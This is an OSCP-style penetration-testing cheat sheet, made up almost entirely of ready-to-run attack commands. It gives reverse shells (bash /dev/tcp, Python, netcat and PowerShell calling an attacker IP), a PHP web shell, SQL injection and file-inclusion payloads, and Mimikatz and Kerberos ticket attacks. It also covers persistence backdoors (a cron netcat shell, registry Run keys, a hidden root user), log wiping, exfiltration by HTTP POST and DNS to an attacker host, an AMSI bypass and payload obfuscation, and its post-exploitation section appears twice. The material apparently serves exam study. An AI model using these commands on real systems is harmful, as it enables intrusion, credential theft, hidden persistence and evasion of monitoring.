# OSCP Cheat sheet

## 1\. General Information

### Important Locations

#### **Windows**

Common configuration, logs, and password-related files:

```plain
C:/Users/Administrator/NTUser.dat  
C:/apache/logs/access.log  
C:/WINDOWS/Repair/SAM  
C:/Windows/system32/config/security.sav  
```

#### **Linux**

Essential system and password-related files:

```plain
/etc/passwd  
/etc/shadow  
/etc/apache2/apache2.conf  
/root/anaconda-ks.cfg  
```

* * *

### File Transfers

#### **Downloading Files on Windows**

```powershell
powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfile C:\temp\<FILE>
certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
```

#### **Downloading Files on Linux**

```bash
wget http://<LHOST>/<FILE>
curl http://<LHOST>/<FILE> > <OUTPUT_FILE>
```

#### **Windows to Kali Transfers**

```bash
kali> impacket-smbserver -smb2support <sharename> .
win> copy file \\KaliIP\sharename
```

* * *

### Adding Users

#### **Windows**

```powershell
net user hacker hacker123 /add  
net localgroup Administrators hacker /add  
net localgroup "Remote Desktop Users" hacker /ADD  
```

#### **Linux**

```bash
adduser <username>  
useradd <username>  
useradd -u <UID> -g <group> <username>  
```

* * *

### Password-Hash Cracking

#### **fcrackzip** (Cracking ZIP files)

```bash
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <FILE>.zip
```

#### **John the Ripper**

```bash
ssh2john.py id_rsa > hash  
john hashfile --wordlist=rockyou.txt  
```

#### **Hashcat**

```bash
hashcat -m <mode> hash wordlists.txt --force  
```

* * *

## 2\. Recon and Enumeration

### Port Scanning

#### **Basic Scan**

```bash
nmap -sC -sV <IP> -v 
nmap -T4 -A -p- <IP> -v  
```

#### **Scanning with Vulnerability Scripts**

```bash
sudo nmap -sV -p 443 --script "vuln" <IP>  
```

#### **Windows Port Testing (PowerShell)**

```powershell
Test-NetConnection -Port <port> <IP>  
```

* * *

### FTP Enumeration

#### **Basic Login**

```bash
ftp <IP>  
# Login if anonymous access is allowed  
```

#### **Uploading/Downloading Files**

```bash
put <file>   # Upload  
get <file>   # Download  
```

#### **Nmap FTP Scripts**

```bash
nmap -p21 --script=ftp-anon <IP>  
```

#### **Bruteforcing FTP Credentials**

```bash
hydra -L users.txt -P passwords.txt <IP> ftp  
```

* * *

### SSH Enumeration

#### **Login via SSH**

```bash
ssh user@IP  
```

#### **Using Private Key (id\_rsa)**

```bash
chmod 600 id_rsa  
ssh user@IP -i id_rsa  
```

#### **Cracking id\_rsa with John**

```bash
ssh2john id_rsa > hash  
john --wordlist=/usr/share/wordlists/rockyou.txt hash  
```

#### **Bruteforce SSH**

```bash
hydra -l username -P passwords.txt <IP> ssh  
```

* * *

### SMB Enumeration

#### **Nmap Scripts for SMB**

```bash
nmap -p445 --script=smb-enum-shares,smb-enum-users <IP>
```

#### **Listing Shares in Windows**

```plain
net view \\<computername/IP> /all  
```

#### **CrackMapExec SMB**

```bash
crackmapexec smb <IP> -u username -p password --shares  
crackmapexec smb <IP> -u username -p password --users  
```

#### **SMB Client**

```bash
smbclient -L //<IP>  
smbclient //<IP>/share -U username  
```

#### **Downloading SMB Shares**

```bash
mask ""  
recurse ON  
prompt OFF  
mget *  
```

* * *

### HTTP/S Enumeration

#### **Manual Recon**

*   Check `/robots.txt`, view source-code.
*   Identify CMS using **Wappalyzer**.

#### **Directory and File Discovery**

```bash
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/big.txt  
```

#### **Vulnerability Scanning**

```bash
nikto -h <target_url>  
```

#### **Bruteforcing Web Login Forms**

```bash
hydra -L users.txt -P password.txt <IP or domain> http-post-form "/path:username=^USER^&password=^PASS^"
```

####   

## 3\. Web Attacks

### Directory Traversal

```bash
cat /etc/passwd  # Displaying file via absolute path  
cat ../../../etc/passwd  # Relative path traversal  
```

#### **Web Exploitation Example**

```bash
http://target.com/index.php?page=../../../../../../../../etc/passwd  
```

#### **Windows Version**

```bash
http://target.com/public/plugins/alertlist/../../../../../../../../Windows/win.ini  
```

#### **URL Encoding Bypass**

```bash
curl http://target.com/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd  
```

* * *

### Local File Inclusion (LFI)

```bash
curl "http://target.com/index.php?page=data://text/plain,<?php system('id'); ?>"  
```

#### **PHP Wrapper for Base64 Encoding**

```bash
curl http://target.com/index.php?page=php://filter/convert.base64-encode/resource=index.php  
```

#### **LFI to Reverse Shell**

```bash
bash -c "bash -i >& /dev/tcp/<IP>/4444 0>&1"  
```

* * *

### Remote File Inclusion (RFI)

1. **Obtain a PHP reverse shell**
2. **Host a file server**
3. **Inject RFI payload**

```bash
http://target.com/index.php?page=http://attacker-ip/reverse-shell.php  
```

* * *

### SQL Injection

#### **Basic SQL Injection Payloads**

```sql
admin' OR '1'='1' --
" OR "1"="1" --
```

#### **SQLMap - Automated SQL Injection**

```bash
sqlmap -u "http://target.com/index.php?id=1" --dbs  
sqlmap -u "http://target.com/index.php?id=1" -p id --dump  
```

#### **SQLMap OS Shell**

```bash
sqlmap -u "http://target.com/index.php" --os-shell  
```

* * *

### WordPress Attacks

```bash
wpscan --url "target" --enumerate vp,u,vt,tt  
```

### Drupal Attacks

```bash
droopescan scan drupal -u http://target  
```

### Joomla Attacks

```bash
joomscan --url http://target.com  
```

* * *

## 4\. Exploitation

### Reverse Shells

#### **Msfvenom Payloads**

```bash
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe  
msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php  
```

#### **One-Liner Reverse Shells**

```bash
bash -i >& /dev/tcp/<IP>/4444 0>&1  
python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'  
```

#### **PowerShell Reverse Shell**

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("<IP>",4444)
```

* * *

### Windows Privilege Escalation

#### **Basic Service Commands**

```powershell
Start-Service <service>  
Stop-Service <service>  
Restart-Service <service>  
```

#### **Automated Privilege Escalation Scripts**

```powershell
winpeas.exe  
Invoke-PrivescCheck.ps1  
PowerUp.ps1  
```

#### **Token Impersonation**

```powershell
PrintSpoofer.exe -i -c powershell.exe  
JuicyPotatoNG.exe -t * -p "cmd.exe"  
```

#### **Exploiting Weak Services**

```powershell
sc qc <service>  # Find binary path  
sc config <service> binpath="C:\payload.exe"  
sc start <service>  
```

#### **AlwaysInstallElevated Exploit**

```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated  
msiexec /quiet /qn /i reverse.msi  
```

* * *

### Linux Privilege Escalation

#### **Getting a TTY Shell**

```bash
python -c 'import pty; pty.spawn("/bin/bash")'  
/bin/bash -i  
```

#### **Checking SUID Binaries**

```bash
find / -perm -u=s -type f 2>/dev/null  
```

#### **Checking Sudo Permissions**

```bash
sudo -l  
```

#### **Exploiting Cron Jobs**

```bash
cat /etc/crontab  
```

#### **Mounting NFS Shares**

```bash
showmount -e <target IP>  
mount -o rw <targetIP>:<share> <mount_dir>  
```

  

## 5\. Active Directory Pentesting

### Enumeration

#### **Checking Local Administrators on a Domain-Joined Machine**

```powershell
net localgroup Administrators  
```

#### **PowerView Commands**

```powershell
Import-Module .\PowerView.ps1  
Get-NetDomain  # Basic domain information  
Get-NetUser  # List all domain users  
Get-NetGroup "Domain Admins"  # List domain admins  
Get-NetComputer  # List all computers in the domain  
```

#### **Finding Users with Admin Access**

```powershell
Find-LocalAdminAccess  
```

#### **Checking Active Sessions on a Remote System**

```powershell
Get-NetSession -ComputerName <hostname>  
```

#### **Finding AS-REP Roastable Accounts**

```powershell
Get-DomainUser -PreauthNotRequired  
```

#### **Checking for Kerberoastable Accounts**

```powershell
Get-NetUser -SPN | select serviceprincipalname  
```

* * *

### BloodHound (Graph-Based AD Enumeration)

#### **Collecting Data with SharpHound**

```powershell
Import-Module .\Sharphound.ps1  
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\temp  
```

#### **Running BloodHound on Attacker Machine**

```bash
neo4j console  # Start the database  
```

*   Upload `.json` files to BloodHound and analyze for attack paths.

* * *

### Attacking Active Directory Authentication

#### **Password Spraying with CrackMapExec**

```bash
crackmapexec smb <IP or subnet> -u users.txt -p 'Password123' -d <domain> --continue-on-success  
```

#### **Password Spraying with Kerbrute**

```bash
kerbrute passwordspray -d corp.com users.txt "Password123"  
```

* * *

### AS-REP Roasting

#### **Extracting AS-REP Hashes**

```bash
impacket-GetNPUsers -dc-ip <DC-IP> <domain>/<user>:<pass> -request  
```

#### **Cracking AS-REP Hashes**

```bash
hashcat -m 18200 hashes.txt wordlist.txt --force  
```

* * *

### Kerberoasting

#### **Extracting Kerberoastable Hashes**

```powershell
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast  
```

#### **Kerberoasting with Impacket**

```bash
impacket-GetUserSPNs -dc-ip <DC-IP> <domain>/<user>:<pass> -request  
```

#### **Cracking Kerberoasted Hashes**

```bash
hashcat -m 13100 hashes.txt wordlist.txt --force  
```

* * *

### Silver Ticket Attack

#### **Extracting Hash of SPN User with Mimikatz**

```powershell
sekurlsa::logonpasswords  
```

#### **Extracting Domain SID**

```powershell
whoami /user  
```

#### **Forging a Silver Ticket with Mimikatz**

```powershell
kerberos::golden /sid:<domainSID> /domain:<domain-name> /ptt /target:<targetsystem.domain>
```

* * *

### SecretsDump - Dumping NTLM Hashes

#### **Dumping Hashes from a Domain Controller**

```bash
secretsdump.py <domain>/<user>:<password>@<IP>  
```

* * *

### Lateral Movement in Active Directory

#### **Using PsExec to Gain a Shell**

```bash
psexec.py <domain>/<user>:<password>@<IP>  
```

#### **Using SMBExec**

```bash
smbexec.py <domain>/<user>:<password>@<IP>  
```

#### **Using WMIExec**

```bash
wmiexec.py <domain>/<user>:<password>@<IP>  
```

#### **Using WinRS (Windows Remote Shell)**

```bash
winrs -r:<computername> -u:<user> -p:<password> "command"  
```

* * *

### Pass-the-Ticket Attack

#### **Extracting Kerberos Tickets with Mimikatz**

```powershell
sekurlsa::tickets /export  
```

#### **Injecting a Ticket**

```powershell
kerberos::ptt [0;76126]-2-0-40e10000-Administrator@krbtgt-<RHOST>.LOCAL.kirbi  
```

#### **Verifying Injected Ticket**

```powershell
klist  
```

* * *

### Golden Ticket Attack

#### **Extracting NTLM Hash of KRBTGT Account**

```powershell
lsadump::lsa /inject /name:krbtgt  
```

#### **Forging a Golden Ticket**

```powershell
kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-235 
```

#### **Verifying Access**

```powershell
klist  
dir \\<RHOST>\admin$  
```

  

## 6\. Post Exploitation

### Extracting Sensitive Information

#### **Powershell History**

```powershell
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt  
```

#### **Searching for Passwords in Files**

```bash
findstr /si password *.txt  
findstr /si password *.xml  
findstr /si password *.ini  
```

#### **Searching for Passwords in Registry**

```powershell
reg query HKLM /f password /t REG_SZ /s  
reg query HKCU /f password /t REG_SZ /s  
```

#### **Finding Passwords in Config Files**

```bash
dir /b /s unattend.xml  
dir /b /s sysprep.inf  
dir /b /s sysprep.xml  
```

#### **Searching for KeePass (KDBX) Files**

```bash
dir /s /b *.kdbx  
```

#### **Cracking KeePass Passwords**

```bash
keepass2john Database.kdbx > keepasshash  
john --wordlist=/usr/share/wordlists/rockyou.txt keepasshash  
```

* * *

### Dumping Windows Password Hashes

#### **Mimikatz - Extracting Hashes and Credentials**

```powershell
privilege::debug  
sekurlsa::logonpasswords  # Extracts hashes & plaintext passwords  
lsadump::sam  
lsadump::lsa /patch  # Dumps SAM  
```

#### **One-Liner Mimikatz Execution**

```powershell
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"  
```

#### **Dumping Hashes from NTDS.dit (Active Directory Database)**

```bash
secretsdump.py <domain>/<user>:<password>@<IP>  
```

* * *

### Pass-the-Hash (PTH) Attack

#### **Using Pass-the-Hash with WinExe**

```bash
pth-winexe -U <domain>/Administrator%aad3b43XXXXXXXX35b51404ee:e0fb1fb857XXXXXXXX238cbe81fe //<IP> cmd.exe  
```

* * *

### Linux Privilege Escalation

#### **Spawning a TTY Shell**

```bash
python -c 'import pty; pty.spawn("/bin/bash")'  
/bin/bash -i  
```

#### **Finding Writable Directories**

```bash
find / -writable -type d 2>/dev/null  
```

#### **Checking Installed Packages (Potential Exploits)**

```bash
dpkg -l  # Debian-based  
rpm -qa  # Red Hat-based  
```

#### **Checking Mounted Drives & Filesystems**

```bash
cat /etc/fstab  
lsblk  
df -h  
```

#### **Checking Running Processes for Passwords**

```bash
watch -n 1 "ps aux | grep pass"  
```

* * *

### Sudo and SUID Exploitation

#### **Checking Sudo Permissions**

```bash
sudo -l  
```

#### **Finding SUID Binaries**

```bash
find / -perm -u=s -type f 2>/dev/null  
```

#### **Finding Capabilities**

```bash
getcap -r / 2>/dev/null  
```

#### **Using GTFOBins for Exploitation**

💡 [GTFOBins: Exploitable SUID binaries](https://gtfobins.github.io/)

* * *

### Exploiting Cron Jobs

#### **Finding Scheduled Cron Jobs**

```bash
cat /etc/crontab  
crontab -l  
ls -la /etc/cron.*  
```

#### **Live Monitoring Cron Jobs (pspy)**

```bash
./pspy64  
```

* * *

### Exploiting NFS Shares

#### **Finding Available Shares**

```bash
showmount -e <target IP>  
cat /etc/exports  
```

#### **Mounting a Share**

```bash
mount -o rw <targetIP>:<share-location> <local-mount-directory>  
```

  

## 6\. Post Exploitation

### Extracting Sensitive Information

#### **Powershell History**

```powershell
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt  
```

#### **Searching for Passwords in Files**

```bash
findstr /si password *.txt  
findstr /si password *.xml  
findstr /si password *.ini  
```

#### **Searching for Passwords in Registry**

```powershell
reg query HKLM /f password /t REG_SZ /s  
reg query HKCU /f password /t REG_SZ /s  
```

#### **Finding Passwords in Config Files**

```bash
dir /b /s unattend.xml  
dir /b /s sysprep.inf  
dir /b /s sysprep.xml  
```

#### **Searching for KeePass (KDBX) Files**

```bash
dir /s /b *.kdbx  
```

#### **Cracking KeePass Passwords**

```bash
keepass2john Database.kdbx > keepasshash  
john --wordlist=/usr/share/wordlists/rockyou.txt keepasshash  
```

* * *

### Dumping Windows Password Hashes

#### **Mimikatz - Extracting Hashes and Credentials**

```powershell
privilege::debug  
sekurlsa::logonpasswords  # Extracts hashes & plaintext passwords  
lsadump::sam  
lsadump::lsa /patch  # Dumps SAM  
```

#### **One-Liner Mimikatz Execution**

```powershell
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"  
```

#### **Dumping Hashes from NTDS.dit (Active Directory Database)**

```bash
secretsdump.py <domain>/<user>:<password>@<IP>  
```

* * *

### Pass-the-Hash (PTH) Attack

#### **Using Pass-the-Hash with WinExe**

```bash
pth-winexe -U <domain>/Administrator%aad3b43XXXXXXXX35b51404ee:e0fb1fb857XXXXXXXX238cbe81fe //<IP> cmd.exe  
```

* * *

### Linux Privilege Escalation

#### **Spawning a TTY Shell**

```bash
python -c 'import pty; pty.spawn("/bin/bash")'  
/bin/bash -i  
```

#### **Finding Writable Directories**

```bash
find / -writable -type d 2>/dev/null  
```

#### **Checking Installed Packages (Potential Exploits)**

```bash
dpkg -l  # Debian-based  
rpm -qa  # Red Hat-based  
```

#### **Checking Mounted Drives & Filesystems**

```bash
cat /etc/fstab  
lsblk  
df -h  
```

#### **Checking Running Processes for Passwords**

```bash
watch -n 1 "ps aux | grep pass"  
```

* * *

### Sudo and SUID Exploitation

#### **Checking Sudo Permissions**

```bash
sudo -l  
```

#### **Finding SUID Binaries**

```bash
find / -perm -u=s -type f 2>/dev/null  
```

#### **Finding Capabilities**

```bash
getcap -r / 2>/dev/null  
```

#### **Using GTFOBins for Exploitation**

💡 [GTFOBins: Exploitable SUID binaries](https://gtfobins.github.io/)

* * *

### Exploiting Cron Jobs

#### **Finding Scheduled Cron Jobs**

```bash
cat /etc/crontab  
crontab -l  
ls -la /etc/cron.*  
```

#### **Live Monitoring Cron Jobs (pspy)**

```bash
./pspy64  
```

* * *

### Exploiting NFS Shares

#### **Finding Available Shares**

```bash
showmount -e <target IP>  
cat /etc/exports  
```

#### **Mounting a Share**

```bash
mount -o rw <targetIP>:<share-location> <local-mount-directory>  
```

## 7\. Exploitation Techniques

### Reverse Shells

#### **Bash Reverse Shell**

```bash
bash -i >& /dev/tcp/<attacker-IP>/4444 0>&1  
```

#### **Python Reverse Shell**

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker-IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"]);'  
```

#### **Netcat Reverse Shell (Linux)**

```bash
nc -e /bin/bash <attacker-IP> 4444  
```

#### **PowerShell Reverse Shell (Windows)**

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("<attacker-IP>",4444)
```

* * *

### Web Shell Exploits

#### **PHP Web Shell**

```php
<?php echo shell_exec($_GET['cmd']); ?>
```

#### **Uploading a Web Shell**

```bash
curl -F "file=@shell.php" http://target.com/upload.php  
```

#### **Executing Commands via Web Shell**

```bash
http://target.com/uploads/shell.php?cmd=whoami  
```

* * *

### Windows Privilege Escalation via Services

#### **Identifying Misconfigured Services**

```powershell
Get-Service | Where-Object {$_.StartType -eq "Auto"}  
```

#### **Modifying a Service to Run a Reverse Shell**

```powershell
sc config <service> binpath= "C:\path\to\shell.exe"  
sc start <service>  
```

* * *

## 8\. Lateral Movement & Persistence

### PsExec - Remote Code Execution

```bash
psexec.py <domain>/<user>:<password>@<target-IP>  
```

### SMBExec - Executing Commands via SMB

```bash
smbexec.py <domain>/<user>:<password>@<target-IP>  
```

### WMIExec - Executing Commands via WMI

```bash
wmiexec.py <domain>/<user>:<password>@<target-IP>  
```

### Pass-the-Ticket (PTT) Attack

#### **Extracting and Injecting a Kerberos Ticket**

```powershell
sekurlsa::tickets /export  
kerberos::ptt [0;76126]-2-0-40e10000-Administrator@krbtgt-<TARGET>.LOCAL.kirbi  
```

### Golden Ticket Attack

#### **Generating a Golden Ticket in Mimikatz**

```powershell
kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21-849420856-235  
```

#### **Verifying Ticket Injection**

```powershell
klist  
dir \\<TARGET>\admin$  
```

* * *

### Windows Persistence Methods

#### **Adding a New Admin User**

```powershell
net user hacker Pass123! /add  
net localgroup Administrators hacker /add  
```

#### **Creating a Persistent Scheduled Task**

```powershell
schtasks /create /tn "Backdoor" /tr "C:\reverse.exe" /sc onlogon /ru SYSTEM  
```

#### **Creating a Registry Backdoor**

```powershell
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d C:\reverse.exe  
```

* * *

### Linux Persistence Methods

#### **Creating a New Root User**

```bash
sudo useradd -o -u 0 -g 0 -M -d /root -s /bin/bash rootkit  
sudo passwd rootkit  
```

#### **Adding a Backdoor SSH Key**

```bash
echo "attacker-ssh-key" >> ~/.ssh/authorized_keys  
```

#### **Setting Up a Cron Job for Persistence**

```bash
echo "*/5 * * * * root /bin/bash -c 'nc -e /bin/bash <attacker-IP> 4444'" | sudo tee -a /etc/crontab  
```

* * *

## 9\. Cleaning Up - Covering Tracks

### Clearing Windows Event Logs

```powershell
wevtutil cl System  
wevtutil cl Security  
wevtutil cl Application  
```

### Deleting Linux Logs

```bash
> /var/log/wtmp  
> /var/log/btmp  
> /var/log/auth.log  
history -c  
```

* * *

## 10\. Advanced Privilege Escalation Techniques

### Windows COM Hijacking for Persistence

```powershell
reg add "HKCU\Software\Classes\mscfile\shell\open\command" /ve /d "C:\reverse-shell.exe" /f  
```

### Linux Exploiting Writable `/etc/passwd`

```bash
echo 'root2:x:0:0:root:/root:/bin/bash' >> /etc/passwd  
su root2  
```

* * *

## 11\. Post-Exploitation Tools

### WinRM Authentication & Execution

```bash
evil-winrm -i <target-IP> -u <user> -p <password>  
```

### Linux Enumeration with LinPEAS

```bash
wget http://attacker-ip/linpeas.sh  
chmod +x linpeas.sh  
./linpeas.sh  
```

* * *

## 12\. Data Exfiltration Techniques

### Exfiltrating Data Over HTTP (Python)

```python
python3 -m http.server 8080  
curl -X POST -d @sensitive-data.txt http://attacker-ip:8080  
```

### Exfiltrating via DNS Tunneling

```bash
dig @attacker-ip -t txt "data-to-exfiltrate"  
```

* * *

## 13\. Bypassing Antivirus & Windows Defender

### PowerShell AMSI Bypass

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)  
```

### Obfuscating Payloads with MSFVenom

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -e x86/shikata_ga_nai -i 5 -o payload.exe  
```

* * *

## 14\. Evading Network Monitoring & Firewalls

### ICMP Shell (When TCP/UDP Are Blocked)

```bash
hping3 -1 --icmp --data 1000 -c 1 <attacker-IP>  
```
